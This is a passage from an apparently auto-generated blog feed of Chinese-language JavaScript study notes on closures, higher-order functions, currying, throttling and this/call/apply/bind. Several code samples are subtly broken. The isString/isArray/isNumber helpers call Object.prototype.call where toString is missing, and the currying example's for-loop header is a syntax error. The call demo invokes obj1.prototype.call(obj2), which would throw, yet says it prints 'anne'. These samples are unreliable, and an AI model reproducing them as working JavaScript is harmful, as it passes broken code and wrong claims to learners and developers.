class="number">0</span>;</span><br><span class="line">    <span class="attr">call</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">value</span>++;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">extent.<span class="title function_">call</span>();  <span class="comment">// 1</span></span><br><span class="line">extent.<span class="title function_">call</span>();  <span class="comment">// 2</span></span><br><span class="line">extent.<span class="title function_">call</span>();  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></li><li><h4 id="用闭包实现命令模式"><a href="#用闭包实现命令模式" class="headerlink" title="用闭包实现命令模式"></a>用闭包实现命令模式</h4><p>命令模式的意图是把请求封装为对象，从而分离请求的发起者和请求的接收者（执行者）之间的耦合关系。</p></li><li><h4 id="闭包与内存管理"><a href="#闭包与内存管理" class="headerlink" title="闭包与内存管理"></a>闭包与内存管理</h4><p>局部变量本来应该在函数退出的时候被解除引用，但如果局部变量被封闭在闭包形成的环境中，那么这个局部变量就能一直生存下去。<strong>使用闭包的原因是我们选择主动把一些变量封闭在闭包中，因为可能在以后还需要使用这些变量</strong>，把这些变量放在闭包中和放在全局作用域，对内存方面的影响是一致的。不能说成是内存泄露。</p><p>跟闭包和内存泄漏有关系的地方是，使用闭包的同时比较容易形成<strong>循环引用</strong>，<strong>如果闭包的作用域链中保存着一些DOM节点，这时候就有可能造成内存泄漏</strong>，但这本身并非闭包问题，也并非JavaScript的问题，在基于引用计数策略的垃圾回收机制中，如果两个对象之间形成了循环引用，那么这两个对象都无法被回收，但循环引用造成的内存泄露在本质上也不是闭包造成的。</p><p>同样，如果要解决循环引用带来的内存泄露问题，我们<strong>只需要把循环引用中的变量设为null即可</strong>。将变量设置为null意味着<strong>切断变量与它此前引用的值之间的连接</strong>。当垃圾收集器下次运行时，就会删除这些值并回收它们占用的内存。</p></li></ol><h3 id="二、高阶函数"><a href="#二、高阶函数" class="headerlink" title="二、高阶函数"></a>二、高阶函数</h3><p>高阶函数是指至少满足下列条件之一的函数：</p><ul><li><p>函数可以作为参数被传递</p></li><li><p>函数可以作为返回值输出</p></li><li><p>一个函数可以接收另一个函数作为参数</p></li></ul><ol><li><h4 id="函数作为参数传递"><a href="#函数作为参数传递" class="headerlink" title="函数作为参数传递"></a>函数作为参数传递</h4><ol><li><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><p>在ajax异步请求的应用中，回调函数的使用非常频繁。当我们想在ajax请求返回之后做一些事情，但又并不知道请求返回的确切时间时，最常见的方案就是把callback函数当作参数传入发起ajax请求的方法中，待请求完成之后执行callback函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getUserInfo = <span class="keyword">function</span>(<span class="params">userId, callback</span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(<span class="string">&#x27;http://xxx.com/getUserInfo?&#x27;</span>+userId,<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> callback === <span class="string">&#x27;function&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">callback</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getUserInfo</span>(<span class="number">13157</span>,<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(data.<span class="property">userName</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>回调函数的应用不仅只在异步请求中，当一个函数不适合执行一些请求时，我们也可以把这些请求封装成一个函数，并把它作为参数传递给另外一个函数，”委托”给另外一个函数来执行。</p></li><li><h5 id="Array-prototype-sort"><a href="#Array-prototype-sort" class="headerlink" title="Array.prototype.sort"></a><code>Array.prototype.sort</code></h5><p><code>Array.prototype.sort</code>接受一个函数当作参数，这个函数里面封装了数组元素的排列顺序。从<code>Array.prototype.sort</code>的使用可以看到，我们的目的是对数组进行排序，这是不变的部分；而使用什么规则去排序，则是可变的部分。把可变的部分封装在函数的参数里，动态传入<code>Array.prototype.sort</code>，使<code>Array.prototype.sort</code>方法成为了一个非常灵活的方法，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>].<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;   <span class="comment">// 从小到大排</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol></li><li><h4 id="函数作为返回值输出"><a href="#函数作为返回值输出" class="headerlink" title="函数作为返回值输出"></a>函数作为返回值输出</h4><ol><li><h5 id="判断数据类型"><a href="#判断数据类型" class="headerlink" title="判断数据类型"></a>判断数据类型</h5><p>判断一个数据是否是数组，在以往的实现中，可以基于鸭子类型的概念来判断，比如判断这个数据有没有length属性，有没有sort方法或者slice方法等。但更好的方式是用<code>Object.prototype.toString</code>来计算。<code>Object.prototype.toString.call(obj)</code>返回一个字符串，比如<code>Object.prototype.toString.call([1,2,3])</code>总是返回<code>&quot;[object Array]&quot;</code>。所以我们可以编写一系列的isType函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isString = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object String]&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> isArray = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object Array]&#x27;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> isNumber = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object Number]&#x27;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h5 id="getSingle"><a href="#getSingle" class="headerlink" title="getSingle"></a>getSingle</h5><p>这个高阶的例子，既把函数当作参数传递，又让函数执行后返回了另一个函数。可以看看getSingle的效果：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getScript = <span class="title function_">getSingle</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> script1 = <span class="title function_">getScript</span>();</span><br><span class="line"><span class="keyword">var</span> script2 = <span class="title function_">getScript</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(script1 === script2);   <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ol></li><li><h4 id="高阶函数实现AOP"><a href="#高阶函数实现AOP" class="headerlink" title="高阶函数实现AOP"></a>高阶函数实现AOP</h4><p>AOP（面向切面编程）的主要作用是把一些跟核心业务逻辑模块无关的功能抽离出来，这些跟业务逻辑无关的功能通常包括日志统计、安全控制、异常处理等。把这些功能抽离出来后，再通过”动态织入”的方式掺入业务逻辑模块中。</p></li><li><h4 id="高阶函数的其他应用"><a href="#高阶函数的其他应用" class="headerlink" title="高阶函数的其他应用"></a>高阶函数的其他应用</h4><ol><li><h5 id="currying（柯里化函数）"><a href="#currying（柯里化函数）" class="headerlink" title="currying（柯里化函数）"></a>currying（柯里化函数）</h5><p>currying又称部分求值。一个currying的函数首先会接受一些参数，接受了这些参数之后，该函数并不会立即求值，而是继续返回另一个函数，刚才传入的参数在函数形成的闭包中被保存起来，待到函数被真正需要求值的时候，之前传入的所有参数都会被一次性用于求值。</p><p>假设我们要编写一个计算每个月开销的函数。在每天结束之前，我们都要记录今天花掉了多少钱：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> monthlyCost = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> cost = <span class="keyword">function</span>(<span class="params">money</span>)&#123;</span><br><span class="line">    monthlyCost += money;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">cost</span>(<span class="number">100</span>);            <span class="comment">// 第一天开销</span></span><br><span class="line"><span class="title function_">cost</span>(<span class="number">200</span>);            <span class="comment">// 第二天开销</span></span><br><span class="line"><span class="title function_">cost</span>(<span class="number">300</span>);            <span class="comment">// 第三天开销</span></span><br><span class="line"><span class="comment">//cost(700);          // 第三十天开销</span></span><br><span class="line"><span class="title function_">alert</span>(monthlyCost);   <span class="comment">// 600</span></span><br></pre></td></tr></table></figure><p>每天结束后我们都会记录并计算到今天为止花掉的钱。但我们其实并不太关心每天花掉了多少钱，而只想知道月底的时候会花掉多少钱。也就是说，实际上只需要在月底计算一次。</p><p>如果在每个月前29天，我们都只是保存好当天的开销，直到第30天才进行求值计算，这样就达到了我们的要求。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接受一个函数fn作为参数，返回一个新函数（会收集所有传入的参数，并将它们一次性应用到fn函数上</span></span><br><span class="line"><span class="keyword">var</span> currying = <span class="keyword">function</span>(<span class="params">fn</span>)&#123;  </span><br><span class="line">    <span class="comment">// 存储传递给柯里化函数的参数</span></span><br><span class="line">    <span class="keyword">var</span> args = [];        </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 如果没有传入参数，就将存储到args中的参数一次性应用到fn函数上</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 调用fn函数，将args数组中的所有参数传递给fn</span></span><br><span class="line">            <span class="keyword">return</span> fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);    </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 如果传递了参数则将参数增加到args中</span></span><br><span class="line">            [].<span class="property">push</span>.<span class="title function_">apply</span>(args, <span class="variable language_">arguments</span>);  </span><br><span class="line">            <span class="comment">// 返回当前正在执行的函数本身</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">arguments</span>.<span class="property">callee</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> cost = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> money = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;l = <span class="variable language_">arguments</span>.<span class="property">length</span>; i&lt;l; i++)&#123;</span><br><span class="line">            money += <span class="variable language_">arguments</span>[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">var</span> cost = <span class="title function_">currying</span>(cost);</span><br><span class="line"></span><br><span class="line"><span class="title function_">cost</span>(<span class="number">100</span>);</span><br><span class="line"><span class="title function_">cost</span>(<span class="number">200</span>);</span><br><span class="line"><span class="title function_">cost</span>(<span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="title function_">cost</span>());</span><br></pre></td></tr></table></figure><p>当调用cost()时，如果明确地带上了一些参数，表示此时并不进行真正的求值计算，而是把这些参数保存起来，此时让cost函数返回另外一个函数。只有当我们以不带参数的形式执行cost()时，才利用前面保存的所有参数，真正开始进行求值计算。</p></li><li><h5 id="uncurrying"><a href="#uncurrying" class="headerlink" title="uncurrying"></a>uncurrying</h5><p>在类数组对象arguments借用<code>Array.prototype</code>的方法之前，先把<code>Array.prototype.push.call</code>这句代码转换为一个通用的push函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> push = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">uncurrying</span>();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">push</span>(<span class="variable language_">arguments</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);   <span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line">&#125;)(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>通过uncurrying的方式，<code>Array.prototype.push.call</code>变成了一个通用的push函数。这样一来。push函数的作用就跟<code>Array.prototype.push</code>一样了，同样不仅仅局限于只能操作array对象。</p></li><li><h5 id="函数节流"><a href="#函数节流" class="headerlink" title="函数节流"></a>函数节流</h5><p>函数大多数情况下都是由用户主动调用触发的，除非是函数本身的实现不合理，否则我们一般不会遇到跟性能相关的问题。但是在一些少数情况下，函数的触发不是由用户直接控制的。在这些场景下，函数有可能被非常频繁地调用，而造成大的性能问题。</p><ol><li><p>函数被频繁调用的场景</p><ul><li><p>window.onresize事件</p></li><li><p>mousemove事件</p></li><li><p>上传进度</p></li></ul></li><li><p>函数节流的原理</p><p>上面提到的三个场景，发现他们面临的共同问题是函数被触发的频率太高。通过使用定时器来控制函数的频率。</p></li></ol></li><li><h5 id="分时函数"><a href="#分时函数" class="headerlink" title="分时函数"></a>分时函数</h5><p>某些函数确实是用户主动调用的，但因为一些客观的原因，这些函数会严重影响页面性能。处理大量数据或高频率事件时，通过将任务拆分成多个小块来提高性能和响应速度的技术，确保在执行复杂的操作时不会阻塞浏览器UI线程。</p><p><strong>比如把1秒钟创建1000个节点，改为每隔200毫秒创建8个节点。</strong></p></li><li><h5 id="惰性加载函数"><a href="#惰性加载函数" class="headerlink" title="惰性加载函数"></a>惰性加载函数</h5><p>函数执行的分支只会在函数第一次调用才执行。</p></li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看本文之前需要有JavaScript的基础知识&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;一、闭包&quot;&gt;&lt;a href=&quot;#一、闭包&quot; class=&quot;headerlink&quot; title=&quot;一、闭包&quot;&gt;&lt;/a&gt;一、闭包&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;h4 id=&quot;变量的作用域&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>this、call和apply</title>
    <link href="http://cychenhaibin.github.io/2024/08/31/this%E3%80%81call%E5%92%8Capply/"/>
    <id>http://cychenhaibin.github.io/2024/08/31/this%E3%80%81call%E5%92%8Capply/</id>
    <published>2024-08-30T16:56:47.000Z</published>
    <updated>2024-08-30T16:59:24.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、this"><a href="#一、this" class="headerlink" title="一、this"></a>一、this</h3><p>this的四种绑定方式：<strong>隐式绑定</strong>、<strong>显式绑定</strong>、<strong>window绑定</strong>、<strong>new绑定</strong></p><p><strong>隐式绑定</strong>：使用对象来调用其内部的一个方法，该方法的this是指向对象本身的，this永远指向最后调用它的那个对象。</p><p><strong>显式绑定</strong>：通过call来设置函数执行上下文的this指向。</p><p><strong>window绑定</strong>：在ES5严格模式中，JavaScript不会默认this指向window对象，而会正确地把this保持为underfined。</p><p><strong>new绑定</strong>：用new调用函数时，JavaScript解释器都会在底层创建一个全新地对象并把这个对象当做this</p><p>改变this指向：</p><ul><li><p>使用ES6箭头函数</p></li><li><p>在函数内部使用_this &#x3D; this</p></li><li><p>使用apply、call、bind</p></li><li><p>new一个实例化对象</p></li></ul><ol><li><h4 id="this的指向"><a href="#this的指向" class="headerlink" title="this的指向"></a>this的指向</h4><ol><li><h5 id="作为对象方法调用"><a href="#作为对象方法调用" class="headerlink" title="作为对象方法调用"></a>作为对象方法调用</h5><p>当函数作为对象地方法被调用时，this指向该对象</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">getA</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span> === obj);     <span class="comment">// true</span></span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">a</span>);           <span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_">getA</span>();</span><br></pre></td></tr></table></figure></li><li><h5 id="作为普通函数调用"><a href="#作为普通函数调用" class="headerlink" title="作为普通函数调用"></a>作为普通函数调用</h5><p>作为普通函数调用，this指向全局对象</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;globalName&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> getName = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getName</span>());</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;globalName&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> myObject = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;seven&#x27;</span>,</span><br><span class="line">    <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> getName = myObject.<span class="property">getName</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getName</span>());</span><br></pre></td></tr></table></figure><p><strong>箭头函数注意：</strong></p><ol><li><p>函数体内this就是定义时所的对象，而非调用时的所在对象，和普通函数相反</p></li><li><p>箭头函数无法用做构造器，即不能使用new调用</p></li><li><p>不能使用arguments对象，不存在</p></li><li><p>不可以使用yield命令，即无法用做Generator命令</p></li></ol></li><li><h5 id="构造器调用"><a href="#构造器调用" class="headerlink" title="构造器调用"></a>构造器调用</h5><p>JavaScript中没有类，但是可以从构造器中创建对象，同时也提供了new运算符，使得构造函数看起来更像一个类。</p><p>除了宿主提供的一些内置函数，大部分JavaScript函数都可以当作构造器使用。构造器的外表跟普通函数一摸一样，它们的区别在于被调用的方式。当用new运算符调用函数时，该函数总是返回一个对象，通常情况下，构造器里的this就指向返回的这个对象。</p></li><li><h5 id="Function-prototype-call-或-Function-prototype-apply调用"><a href="#Function-prototype-call-或-Function-prototype-apply调用" class="headerlink" title="Function.prototype.call 或 Function.prototype.apply调用"></a><code>Function.prototype.call</code> 或 <code>Function.prototype.apply</code>调用</h5><p>跟普通函数相比，用 <code>Function.prototype.call</code> 或 <code>Function.prototype.apply</code>可以动态地改变传入函数地this。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;sven&#x27;</span>,</span><br><span class="line">    <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;anne&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1.<span class="title function_">getName</span>());             <span class="comment">// sven</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">call</span>(obj2));  <span class="comment">// anne</span></span><br></pre></td></tr></table></figure></li></ol></li><li><h4 id="丢失的this"><a href="#丢失的this" class="headerlink" title="丢失的this"></a>丢失的this</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">myName</span>: <span class="string">&#x27;sven&#x27;</span>,</span><br><span class="line">    <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">myName</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">getName</span>());    <span class="comment">// sven</span></span><br><span class="line"><span class="keyword">var</span> getName2 = obj.<span class="property">getName</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getName2</span>());       <span class="comment">// underfined</span></span><br></pre></td></tr></table></figure><p>当调用obj.getName时，getName方法是作为obj对象地属性被调用时，此时的this指向obj对象，所以<code>obj.getName()</code>输出sven。</p><p>当另外一个变量getName2来引用 <code>obj.getName</code>，并且调用getName2时，此时时普通函数调用方式，this是指向全局window的，所以程序执行结果是underfined。</p></li></ol><h3 id="二、call-和-apply"><a href="#二、call-和-apply" class="headerlink" title="二、call 和 apply"></a>二、call 和 apply</h3><p>bind是创建一个新对象</p><ul><li><p>call和apply是立即执行，bind则是返回了一个绑定的this的新函数，只有调用了这个新函数才真正的调用了目标函数。</p></li><li><p>bind函数存在多次绑定问题，如果多次绑定this，则以第一次为准</p></li><li><p>bind函数实际上是显式绑定（call、apply）的一个变种，称为硬绑定，ES5中提供了内置的方法 <code>Function。prototype.bind</code></p></li></ul><ol><li><h4 id="call和apply的区别"><a href="#call和apply的区别" class="headerlink" title="call和apply的区别"></a>call和apply的区别</h4><p>apply接受两个参数，第一个参数指定了函数体内的this对象的指向，第二个参数为一个带下标的集合，这个集合可以为数组，也可以为类数组，apply方法把这个集合中的元素作为参数传递给被调用的函数。</p><p>call传入的参数量不固定，跟apply不同的是，第一个参数也是代表函数体内的this指向，从第二个参数往后，每个参数被依次传入函数。</p><p>当使用call或者apply的时候，如果我们传入的第一个参数为null，函数体内的this会指向默认的宿主对象，在浏览器中则是window。</p><p>但如果是在严格模式下，函数体内的this还是为null</p></li><li><h4 id="call和apply的用途"><a href="#call和apply的用途" class="headerlink" title="call和apply的用途"></a>call和apply的用途</h4><ol><li><h5 id="改变this指向"><a href="#改变this指向" class="headerlink" title="改变this指向"></a>改变this指向</h5><p>call和apply最常见的用途是改变函数内部的this指向</p><p>在实际开发中，经常会遇到this指向被不经意改变的场景，比如有一个div节点，div节点的onclick事件中的this本来是指向这个div的：嵌套中的this不会从外层函数中继承</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">id</span>);      <span class="comment">// div1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如该事件函数中有一个内部函数func，在事件内部调用func函数时，func函数体内的this就指向window，而不是我们预期的div：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">id</span>);      <span class="comment">// div1</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">id</span>);  <span class="comment">// underfined</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候我们用call来修正func函数内的this，使其依然指向div：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> func = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">id</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    func.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h5 id="Function-prototype-bind"><a href="#Function-prototype-bind" class="headerlink" title="Function.prototype.bind"></a><code>Function.prototype.bind</code></h5><p>大部分高级浏览器都实现了内置的 <code>Function.prototype.bind</code>，用来指定函数内部的this指向</p></li><li><h5 id="借用其他对象的方法"><a href="#借用其他对象的方法" class="headerlink" title="借用其他对象的方法"></a>借用其他对象的方法</h5><p>我们知道，杜鹃既不会筑巢，也不会孵椆，而是把自己的蛋寄托给云雀等其他鸟类，让它们代为孵化和养育。</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5></li></ol><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一、this&quot;&gt;&lt;a href=&quot;#一、this&quot; class=&quot;headerlink&quot; title=&quot;一、this&quot;&gt;&lt;/a&gt;一、this&lt;/h3&gt;&lt;p&gt;this的四种绑定方式：&lt;strong&gt;隐式绑定&lt;/strong&gt;、&lt;strong&gt;显式绑定&lt;/strong</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>面向对象的JavaScript</title>
    <link href="http://cychenhaibin.github.io/2024/08/30/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84JavaScript/"/>
    <id>http://cychenhaibin.github.io/2024/08/30/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84JavaScript/</id>
    <published>2024-08-30T07:38:47.000Z</published>
    <updated>2024-08-30T11:34:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>看本文之前需要有JavaScript的基础知识</p><hr><p>JavaScript没有提供传统面向对象语言中的类式继承，而是通过原型委托的方式来实现对象与对象之间的继承，也没有在语言层面提供对抽象类和接口的支持</p><h3 id="一、动态类型语言和鸭子模型"><a href="#一、动态类型语言和鸭子模型" class="headerlink" 